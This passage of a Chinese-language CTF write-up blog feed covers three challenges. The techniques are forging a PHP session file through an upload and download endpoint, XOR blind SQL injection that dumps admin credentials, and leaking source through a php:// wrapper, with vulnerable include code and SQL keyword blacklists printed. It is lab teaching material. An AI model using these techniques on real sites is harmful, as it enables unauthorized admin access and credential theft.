class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Length: '</span> <span class="token operator">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"downloaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>显然，只要让session为admin就能拿到flag。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820142952016.png"></p><p>先测试了下上传，没有反馈，奇怪。</p><p>再试试下载</p><blockquote><p>php的session默认存储文件名是sess_+PHPSESSID的值</p></blockquote><p>session保存路径和上传路径一致，所以可以直接上传自己构造的session。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820160430631.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820155422265.png"></p><pre class="line-numbers language-none"><code class="language-none">direction&#x3D;download&amp;filename&#x3D;sess_d7bd37299f06fbba3ab39c8a8008aad2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820155355360.png"></p><p>根据之前做的一道题里的关于php系列化引擎知识点<a href="https://syunaht.com/p/3063917200.html#toc-heading-5">刷题笔记:bestphp’s revenge</a></p><blockquote><p>php_binary引擎:键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p></blockquote><p>可知这用的是php_binary引擎</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);session_save_path(&quot;D:\\phpstudy_pro\\WWW\\localhost&quot;);session_start();$_SESSION[&#39;username&#39;] &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成后，把文件名改为sess，用<code>hash_file()</code>函数计算下</p><pre class="line-numbers language-none"><code class="language-none">432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，按照这两行代码，上传的文件名就是sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820161223950.png"></p><p>上传需要BODY参数，所以拿postman整吧</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820162158835.png"></p><p>再试试有没有上传成功。</p><pre class="line-numbers language-none"><code class="language-none">direction&#x3D;download&amp;filename&#x3D;sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820162241097.png"></p><p>然后还需要验证success.txt</p><p>先查查<code>file_exists()</code>有没有漏洞，百度到可以/file/**/../checkfile这样利用，可惜在这用不上。</p><blockquote><p>file_exists()函数检查文件或目录是否存在。</p></blockquote><p>该函数是检查文件或目录，所以利用attr上传个success.txt文件夹即可。</p><p>上传后把cookie里的PHPSESSID改为<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>即可拿到flag。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[Black Watch 入群题]Web</title>
      <link href="/p/4138483003.html"/>
      <url>/p/4138483003.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820105016300.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>抓包，看到有?id</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820120740418.png"></p><p>老规矩，先fuzz一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820120847396.png"></p><p>单引号双引号都被过滤了，这可咋整</p><p>试试1^1,1^0，可行。那懂了，是异或盲注。</p><p>跑脚本</p><pre class="line-numbers language-none"><code class="language-none">库news表admin,contents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>admin表的字段</p><pre class="line-numbers language-none"><code class="language-none">id,username,password,is_enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">username:aba004e4,b822ac37password:f8c1a48a,efce82ab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>contents表的字段</p><pre class="line-numbers language-none"><code class="language-none">id,title,content,is_enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿b822ac37，efce82ab登陆下，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[N1CTF 2018]eating_cms</title>
      <link href="/p/2163136062.html"/>
      <url>/p/2163136062.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[system注释|system执行漏洞|php system]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819221635361.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>有个/register.php可以注册用户</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819221715070.png"></p><p><code>user.php?page=guest</code>，第一反应先试试伪协议</p><p>guest.php</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKaWYgKEZMQUdfU0lHICE9IDEpewogICAgZGllKCJ5b3UgY2FuIG5vdCB2aXNpdCBpdCBkaXJlY3RseSAiKTsKfQppbmNsdWRlICJ0ZW1wbGF0ZXMvZ3Vlc3QuaHRtbCI7Cj8+Cgo&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>user.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 